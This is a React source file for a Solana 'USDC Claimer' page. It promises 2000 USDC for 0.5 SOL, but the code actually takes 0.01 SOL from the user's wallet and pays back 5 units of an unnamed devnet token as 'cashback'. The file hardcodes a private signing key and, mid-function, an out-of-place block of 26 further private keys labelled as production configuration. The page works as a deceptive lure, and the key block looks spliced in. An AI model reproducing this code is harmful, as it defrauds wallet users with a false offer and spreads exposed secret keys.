/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2Gbr3nfQt1ELddy6v4aaMVpmetQLmMwAEvqyoiRqZ6SfASMW32vRNCJswZHDZboFhFYYZNZFSZiJKGjTAogwQaiT"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5nWZcgSXGN4ASm21rCorq7iyrt2unYVvkdzugY1yWR42LofeaiaqFfx8csghf6Lgqe1WqrBrFQETeebLirgu1xMZ",
  "key1": "5qnD9hHbJU4mzXNiRpzqUGk8Tg2haqzR7co2Piasix3CADMZEq64tgfxXGjQyw54kbYypo8jazxthsgLDiBEuEEr",
  "key2": "4BSBmkBx7azGseteDAdKqVkkb5fMqMvhPWSgDKyVJVuHDGqXDXppvtSTGHQHxQiVyn1r5EZW7dV3EDteahX2FQpd",
  "key3": "5g3tF1kHgAMUCCo47GdMGesdzG1fzyJa1KWNTtyKrRMjvwyrDnKLLWbRiABbAKbURvRBE8MCmk5FHPTLdFn31CW5",
  "key4": "5kNDT927pZo38E45uECSvM8dEEPpdvk7Z3ktT4VboXN4fUBKdRooTxdvQtxKdmUayrv4TJ4vGSFWDCvMcPSr91bN",
  "key5": "SV7q5LSKVJNABh1gmZvvfHgjyELo4fDLMSxsieN1wKX7grsWWAiTvfRoXxMDfqpqf2P9MkSJy51SbRAAjV4AM4C",
  "key6": "29LMLHaqrnek6DsCpkft4H8QHvQTmRgHqBx7hrKhb4VweWTxmHYYQVa3Jgazu5gUv5iz8wgqRpeg8wj8q4RrxvXd",
  "key7": "HfMbpoUbSuX4wGJCuzy2qzoCBfrBgrRq1c4oz3KztZteuQ4Q9QRPNMhkKDo3QxtZz9oXZBVc1sK6APL3fso2Vk9",
  "key8": "4z2tTiFpUiLpepSS7jbuUXoH67wcpprDZWdhcq6HC4UYcF37dFrcchFsbSQ65Gxd7MERk5NGHkz3ra32LksLe93S",
  "key9": "4kUBngCjUk2VBwPQZbP12QCqYEsjoxhwhZhnpq9H6itZezV6QhbQ6NcS2p4HW1xThEXGCqCCLy4pJ4NoPrqHAzNN",
  "key10": "DukztVhGcGiTpFm3ak62UCYpjaieMoxuU28wRiJ7DKcDUjts6yEim215vAmYojcAw1xs7nyv2yZSiVALsjAT3h4",
  "key11": "63Why1cNkW27tX1DqsKmZqtQDvzDs1DpkZoEPiwxrJZYgjjzExTA639d8ngGNCXq4CpL7eWWfHu9xtMbuj5ZfJgz",
  "key12": "4UWawG7EzzT3uhqLvN3qNwME8kFLuXFC2VXgvgu4QfpG38RqUySctukqoviU5FZ87yjCfV6hLEYLjzsmq9QEENdZ",
  "key13": "4wsyqGw7aom3DT6a8h1MdhiyVw559vKNC3TiAuRRQAdu81nbRpPZ6vQPPCagv6ABAkEAM9r78q91gxhLLNmVmynq",
  "key14": "3yDDwiJ5vioy7N7JrKmieVEE1SPPMqVxqyKDzN4Jb3qs5DmL3hxg1QEu2S6xm7CbgzMVwfvqEYseWe3HkGZDiZnP",
  "key15": "5gYusnMXk8WVNHwCWE55HGENLQNEfHKgy7ood3wx5tDKYTaBzdusmR6gWFkzuFPAx2Znowsq3fnfegoDQo8H6tuz",
  "key16": "3QUtga1HXCFRv6fgeVSHBQZA7rgDhFQefZzGoiiyTzsHZ4BnAZn76i7mTu1KQoPXbYD8y3fndYWD4yGJEt6dx68U",
  "key17": "4DfJnx2bZsRzwcGMQAJjDs1Q45WVSEAYoGUrMLmWw9uG9shdtQA59b9rtNXcpABf9LPF35RfUV9xWc9KkWhSMMSy",
  "key18": "QbLQWhxUz1vfaVCqJZKCohHeyqXuB75c3oqgEpZ3VwK7MvQsY3zmyGHR7joubxzuoiaCubRdknMhiffSX8yZ9Tu",
  "key19": "4edndueNN4vZMPtoMoyvZBv13EdtCjHPr1VayzCkJ3pobRBjAmeQT5SBAH4AjzHsVpge2m7NjMtU8JNpQRiwxLJU",
  "key20": "2PSPKf6q11pK35d96CLZgXVPUcpBEp9bDvQAkYmZAV7ehjmk9N8UF2bVsSBauZgVsb5nXL8bGqCpRYsVLFbxrVVC",
  "key21": "28TW2ALwqXDjWVBCBGTh8oec4xa8Awepaj1DkCfDKzZ4Z6C6nqhZpBPXmWrY9hsXtHyMLiCWBASy8bW1M3h2jPDS",
  "key22": "32bFk46sfiUYQhbWo7NVV4HkLW4sWEGuVsUpdsaHjy1wTrqi2RqJeXCskS9i44AmaMpgCNCotpoecJvWoHzhmTC5",
  "key23": "3sMFNgq21L32MG773r55ipjbMxwnVUmpW2xUg2PjwqMLNA6LjecreMH1uBbByxh5EBpwMaQGL6DcGGGCrE3rFHao",
  "key24": "5s1jv312ymuniQDNPdUeCG5nytoHUyx1ZknqYDS7E7R6jXufNKyWzHMt1bbcv52wa6USk8KncjPTA9iv332SwyRP",
  "key25": "3zSsWqyhDVLZYNugsm1iowPuz9Y2zrdwG2si8futjeNpfvb3qskvnvQ9BbewtqgWi4GARMBt6ZX71qsMBMXAyS6D"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
